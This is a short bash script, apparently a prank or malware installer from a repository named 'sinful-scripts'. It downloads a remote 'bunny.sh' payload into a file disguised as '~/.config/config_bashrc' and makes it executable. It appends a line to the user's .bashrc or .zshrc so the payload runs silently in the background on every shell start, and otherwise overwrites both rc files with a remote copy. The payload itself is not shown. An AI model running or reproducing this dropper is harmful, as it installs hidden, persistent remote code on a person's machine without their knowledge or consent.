#!/bin/bash

if ! test -d "~/.config"
then
  mkdir ~/.config
fi

curl "https://raw.githubusercontent.com/naganori-san/sinful-scripts/master/Linux/Bunny/bunny.sh"  > ~/.config/config_bashrc

chmod +x ~/.config/config_bashrc

if [ -e ~/.bashrc ]
then
  echo "source ~/.config/config_bashrc &" >> ~/.bashrc
  source ~/.bashrc
elif [ -e ~/.zshrc ]
then
  echo "bash ~/.config/config_bashrc & clear" >> ~/.zshrc
  source ~/.zshrc
else
  curl "https://raw.githubusercontent.com/naganori-san/sinful-scripts/master/Linux/Bunny/.bashrc"  > ~/.bashrc
  curl "https://raw.githubusercontent.com/naganori-san/sinful-scripts/master/Linux/Bunny/.bashrc"  > ~/.zshrc
fi
